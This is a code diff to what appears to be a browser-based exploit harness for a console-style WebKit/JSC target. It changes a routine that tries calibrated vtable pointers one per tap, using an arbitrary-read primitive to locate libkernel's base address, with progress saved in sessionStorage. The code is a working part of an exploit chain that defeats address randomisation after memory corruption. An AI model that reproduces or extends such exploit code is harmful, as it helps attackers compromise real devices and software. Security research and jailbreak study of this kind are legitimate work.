@@ -33,12 +33,13 @@ import {
     showLibkernelGuesses,
     scanLibkernelLeakChunk,
     verifyManualLibkernelFromPtr,
+    verifyManualLibkernelFromPtrLite,
     isGetpidStub as lkIsGetpidStub,
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829p";
+const BUILD_ID = "rw-20250829q";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -346,6 +347,7 @@ const CAL_VTABLE_PTRS = [
     { label: "vtable[11]", ptr: "83f34c110", code: "0x2184783" },
 ];
 const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
+const SS_CAL_PTR_I = "wk-cal-ptr-i";
 
 function calExtPtrCandidates() {
     const out = CAL_VTABLE_PTRS.slice();
@@ -373,7 +375,7 @@ const MANUAL_TESTS = [
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
-    { id: "try-cal-ptrs", group: "base", label: "Try cal ptrs" },
+    { id: "try-cal-ptrs", group: "base", label: "Try cal ptr" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
@@ -1785,29 +1787,45 @@ async function runTryCalPtrs() {
         return;
     }
     const cands = calExtPtrCandidates();
+    if (!cands.length) {
+        mark("LK-SKIP", "no cal ptrs loaded");
+        return;
+    }
+    let idx = 0;
+    try {
+        idx = parseInt(sessionStorage.getItem(SS_CAL_PTR_I) || "0", 10) || 0;
+    } catch (_) { }
+    if (idx >= cands.length) {
+        mark("LK-CAL-DONE", "all " + cands.length + " tried — reload page to reset");
+        try { sessionStorage.removeItem(SS_CAL_PTR_I); } catch (_) { }
+        state("cal ptrs exhausted", "bad");
+        return;
+    }
+    const c = cands[idx];
     busy = true;
     setUi();
-    mark("LK-CAL", "build=" + BUILD_ID + " trying " + cands.length + " cal EXT-PTR (walk-back)");
-    scanState("cal ptrs…");
+    scanQuiet = true;
+    mark("LK-CAL", "build=" + BUILD_ID + " " + (idx + 1) + "/" + cands.length
+        + " " + c.label + " " + c.ptr + " (lite ≤25 reads)");
+    if (addrIn) addrIn.value = c.ptr;
     try {
-        for (let i = 0; i < cands.length; i++) {
-            const c = cands[i];
-            mark("LK-CAL-TRY", c.label + " " + c.ptr + " code=" + c.code);
-            if (addrIn) addrIn.value = c.ptr;
-            const v = verifyManualLibkernelFromPtr(p, c.ptr, off);
-            if (v.ok) {
-                mark("LK-OK", c.label + " → " + v.lk + " (" + (v.via || "?") + ")");
-                state("libkernel via " + c.label, "ok");
-                renderOut();
-                flushPersistMilestones();
-                return;
-            }
+        const v = verifyManualLibkernelFromPtrLite(p, c.ptr, off);
+        scanQuiet = false;
+        try { sessionStorage.setItem(SS_CAL_PTR_I, String(idx + 1)); } catch (_) { }
+        if (v.ok) {
+            mark("LK-OK", c.label + " → " + v.lk + " (" + (v.via || "?") + ")");
+            state("libkernel via " + c.label, "ok");
+            try { sessionStorage.removeItem(SS_CAL_PTR_I); } catch (_) { }
+        } else {
             mark("LK-CAL-MISS", c.label + " — " + (v.error || "not libkernel"));
-            await new Promise(r => setTimeout(r, 8));
+            if (idx + 1 < cands.length)
+                mark("LK-HINT", "tap Try cal ptr again (" + (idx + 2) + "/" + cands.length + ")");
+            else
+                mark("LK-CAL-DONE", "all miss — Leak+vtable LK");
+            state("miss " + c.label + " — tap again", "warn");
         }
-        mark("LK-CAL-DONE", "all " + cands.length + " miss — paste single ptr or Leak+vtable LK");
-        state("cal ptrs miss", "bad");
     } catch (err) {
+        scanQuiet = false;
         mark("LK-FAIL", err.message || String(err));
         state("cal ptr error", "bad");
     } finally {
